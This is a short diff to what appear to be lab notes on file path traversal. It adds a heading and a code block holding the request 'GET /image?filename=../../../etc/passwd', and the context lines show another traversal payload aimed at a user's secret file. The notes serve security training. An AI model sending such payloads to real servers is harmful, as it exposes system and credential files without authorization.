@@ -10,6 +10,9 @@ Just scan it with Burp. It will make all the work. If you can get /etc/passwd, b
 /image?filename=/../../../../../../../../../../../../home/carlos/secret
 ```
 
+# File path traversal, simple case
 
-
+```bash
 GET /image?filename=../../../etc/passwd
+```
+
